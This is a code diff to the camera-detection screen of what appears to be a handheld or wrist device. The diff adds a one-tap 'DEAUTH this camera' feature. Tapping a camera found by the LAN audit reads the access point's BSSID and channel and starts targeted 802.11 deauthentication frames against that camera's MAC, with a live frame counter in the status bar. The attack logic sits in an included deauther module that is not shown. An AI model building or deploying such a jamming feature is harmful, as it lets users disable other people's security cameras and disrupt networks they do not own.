@@ -1,5 +1,6 @@
 #include "camera_screen.h"
 #include "cam_audit.h"
+#include "deauther.h"
 #include "flock.h"
 #include "wifi_beacon_manager.h"
 #include "ble_scan_manager.h"
@@ -43,6 +44,11 @@ struct CamDev {                 // coalesced view
 
 static lv_obj_t *screen;
 static lv_obj_t *status_label;
+
+// Deauth-a-camera: tap a LAN-audit result to knock that camera off WiFi.
+static uint8_t s_deauth_mac[6] = {0};
+static void update_status();
+static void on_cam_clicked(lv_event_t *e);
 static lv_obj_t *list_box;
 static lv_obj_t *btn_rf,  *btn_rf_lbl;
 static lv_obj_t *btn_lan, *btn_lan_lbl;
@@ -257,13 +263,24 @@ static void lan_repaint()
                  (f.ip >> 24) & 0xFF, (f.ip >> 16) & 0xFF, (f.ip >> 8) & 0xFF, f.ip & 0xFF);
         add_text(card, l1, &lv_font_montserrat_20, col);
 
-        char l2[88];
-        if (f.has_mac)
-            snprintf(l2, sizeof(l2), "%s   %02X:%02X:%02X:%02X:%02X:%02X",
-                     f.note, f.mac[0], f.mac[1], f.mac[2], f.mac[3], f.mac[4], f.mac[5]);
-        else
-            snprintf(l2, sizeof(l2), "%s", f.note);
-        add_text(card, l2, &lv_font_montserrat_14, lv_color_make(0x99, 0x99, 0x99));
+        // MAC on its own line, BIG — it's the identifier you actually read off.
+        if (f.has_mac) {
+            char macs[24];
+            snprintf(macs, sizeof(macs), "%02X:%02X:%02X:%02X:%02X:%02X",
+                     f.mac[0], f.mac[1], f.mac[2], f.mac[3], f.mac[4], f.mac[5]);
+            add_text(card, macs, &lv_font_montserrat_24, lv_color_white());
+        }
+        if (f.note[0])
+            add_text(card, f.note, &lv_font_montserrat_14, lv_color_make(0x99, 0x99, 0x99));
+
+        // Tap a camera with a known MAC to knock it off WiFi (targeted deauth).
+        if (f.has_mac) {
+            add_text(card, "tap: DEAUTH this camera",
+                     &lv_font_montserrat_14, lv_color_make(0xFF, 0x22, 0x88));
+            lv_obj_add_flag(card, LV_OBJ_FLAG_CLICKABLE);
+            lv_obj_add_event_cb(card, on_cam_clicked, LV_EVENT_CLICKED,
+                                (void *)(intptr_t)order[k]);
+        }
     }
 }
 
@@ -281,6 +298,20 @@ static void update_buttons()
 static void update_status()
 {
     char buf[80];
+
+    // Deauth takes over the whole banner — WiFi is off doing STA/promiscuous, so
+    // the normal "connected/scanning" lines below would read wrong.
+    if (deauther_is_running()) {
+        snprintf(buf, sizeof(buf),
+                 "DEAUTH %02X:%02X:%02X:%02X:%02X:%02X  %lu fr - tap to stop",
+                 s_deauth_mac[0], s_deauth_mac[1], s_deauth_mac[2],
+                 s_deauth_mac[3], s_deauth_mac[4], s_deauth_mac[5],
+                 (unsigned long)deauther_frames_sent());
+        lv_label_set_text(status_label, buf);
+        lv_obj_set_style_text_color(status_label, lv_color_make(0xFF, 0x22, 0x88), LV_PART_MAIN);
+        return;
+    }
+
     if (s_mode == CM_RF) {
         if (s_dev_count == 0) {
             lv_label_set_text(status_label, "Off-air scan: WiFi + BLE");
@@ -331,10 +362,38 @@ static void update_status()
     }
 }
 
+// Tap a LAN-audit camera card: start a targeted deauth on it, or (tapping any
+// card while one is running) stop. Only the camera is kicked — addr1 is its MAC,
+// so the rest of the network (and the watch) stays associated.
+static void on_cam_clicked(lv_event_t *e)
+{
+    if (deauther_is_running()) {          // any tap while active = stop
+        deauther_stop();
+        update_status();
+        return;
+    }
+
+    int idx = (int)(intptr_t)lv_event_get_user_data(e);
+    if (idx < 0 || idx >= s_find_count || !s_find[idx].has_mac) return;
+    if (WiFi.status() != WL_CONNECTED) return;
+
+    // Grab the AP identity while still associated — deauther_start_client drops
+    // STA and goes promiscuous, after which BSSID()/channel() are stale.
+    uint8_t *bssid = WiFi.BSSID();
+    if (!bssid) return;
+    uint8_t ch = WiFi.channel();
+    memcpy(s_deauth_mac, s_find[idx].mac, 6);
+
+    cam_audit_stop();                     // free the LAN scanner before taking the radio
+    deauther_start_client(s_deauth_mac, bssid, ch);
+    update_status();
+}
+
 // ---- mode switches ----------------------------------------------------------
 
 static void enter_rf()
 {
+    deauther_stop();
     cam_audit_stop();
     s_mode = CM_RF;
     s_find_count = 0;
@@ -347,6 +406,7 @@ static void enter_rf()
 
 static void enter_lan(bool run_audit)
 {
+    deauther_stop();
     rf_off();
     s_mode = CM_LAN;
     s_find_count = 0;
@@ -491,6 +551,7 @@ void camera_screen_show()
 
 void camera_screen_stop()
 {
+    deauther_stop();
     rf_off();
     cam_audit_stop();
 }
